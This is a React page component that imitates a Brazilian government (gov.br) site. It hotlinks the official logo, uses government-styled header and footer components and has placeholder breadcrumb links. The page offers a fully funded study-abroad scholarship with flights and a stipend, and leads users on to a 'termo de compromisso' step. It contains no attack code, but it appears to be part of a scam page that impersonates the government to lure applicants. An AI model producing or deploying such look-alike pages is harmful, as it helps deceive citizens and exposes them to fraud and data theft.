import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const DESTINATIONS = {
  usa: {
    key: 'usa',
    title: 'Estados Unidos',
    subtitle: 'Inovação e Pesquisa Acadêmica',
    img: 'https://images.unsplash.com/photo-1485871981521-5b1fd3805eee?w=900&q=80',
  },
  canada: {
    key: 'canada',
    title: 'Canadá',
    subtitle: 'Interculturalidade e Qualidade de Vida',
    img: 'https://images.unsplash.com/photo-1503614472-8c93d56e92ce?w=900&q=80',
  },
  ireland: {
    key: 'ireland',
    title: 'Irlanda',
    subtitle: 'Cultura Europeia e Tecnologia',
    img: 'https://images.unsplash.com/photo-1590089415225-401ed6f9db8e?w=900&q=80',
  },
  australia: {
    key: 'australia',
    title: 'Austrália',
    subtitle: 'Meio Ambiente e Desenvolvimento',
    img: 'https://images.unsplash.com/photo-1506973035872-a4ec16b8e8d9?w=900&q=80',
  },
}

export default function Selecao() {
  const navigate = useNavigate()
  const [selected, setSelected] = useState('usa')

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  const current = DESTINATIONS[selected]

  function confirm() {
    if (!selected) {
      alert('Selecione um destino para continuar')
      return
    }
    localStorage.setItem('selected_destination', selected)
    navigate('/termo-compromisso')
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Assuntos</a>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Notícias</a>
          <span>&gt;</span>
          <span className="text-gray-500">Seleção de Destino</span>
        </div>

        <div
          className="grid gap-5 my-10"
          style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))' }}
        >
          {/* Coluna esquerda: opções */}
          <div
            style={{
              background: 'white',
              padding: 25,
              borderRadius: 8,
              border: '1px solid #e2e8f0',
              boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
            }}
          >
            <h1 className="text-2xl font-black text-blue-900 mb-6 uppercase border-b pb-4">
              País de Destino
            </h1>
            <p className="text-sm text-gray-500 mb-6">
              Selecione o destino de sua preferência. A disponibilidade é
              confirmada em tempo real com as universidades parceiras.
            </p>

            {Object.values(DESTINATIONS).map((d) => {
              const isSel = selected === d.key
              return (
                <div
                  key={d.key}
                  onClick={() => setSelected(d.key)}
                  style={{
                    border: `2px solid ${isSel ? '#1351b4' : '#e2e8f0'}`,
                    borderRadius: 8,
                    padding: 15,
                    marginBottom: 15,
                    cursor: 'pointer',
                    transition: 'all 0.2s',
                    background: isSel ? '#f0f7ff' : 'white',
                  }}
                >
                  <div className="font-bold text-lg text-gray-700">{d.title}</div>
                  <div className="text-xs text-gray-500">{d.subtitle}</div>
                </div>
              )
            })}
          </div>

          {/* Coluna direita: preview */}
          <div
            style={{
              background: 'white',
              padding: 25,
              borderRadius: 8,
              border: '1px solid #e2e8f0',
              boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
            }}
          >
            <img
              src={current.img}
              alt={current.title}
              style={{
                width: '100%',
                height: 180,
                objectFit: 'cover',
                borderRadius: 4,
                marginBottom: 20,
              }}
            />
            <h3 className="text-xl font-black text-blue-900 mb-4 uppercase">
              {current.title}
            </h3>

            <div className="space-y-4 mb-8">
              {[
                {
                  b: 'Bolsa de Estudo:',
                  t: 'Cobertura de 100% da mensalidade na instituição de destino.',
                },
                {
                  b: 'Passagens:',
                  t: 'Auxílio transporte aéreo internacional (ida e volta).',
                },
                {
                  b: 'Subsídio:',
                  t: 'Valor mensal para despesas de moradia e alimentação.',
                },
              ].map((item) => (
                <div key={item.b} className="flex items-start gap-3">
                  <div className="mt-1 w-2 h-2 bg-blue-600 rounded-full flex-shrink-0" />
                  <div className="text-sm text-gray-600 leading-tight">
                    <strong>{item.b}</strong> {item.t}
                  </div>
                </div>
              ))}
            </div>

            <div className="bg-blue-50 p-4 rounded mb-6">
              <p className="text-[11px] text-blue-800 leading-normal italic text-center">
                * A homologação definitiva do destino depende da validação de
                elegibilidade e trâmites consulares.
              </p>
            </div>

            <button
              onClick={confirm}
              style={{
                backgroundColor: '#1351b4',
                color: 'white',
                padding: 18,
                borderRadius: 30,
                fontWeight: 800,
                width: '100%',
                marginTop: 20,
                textTransform: 'uppercase',
                border: 'none',
                cursor: 'pointer',
                fontSize: 14,
                boxShadow:
                  '0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1)',
              }}
            >
              Confirmar Preferência de Destino
            </button>
          </div>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
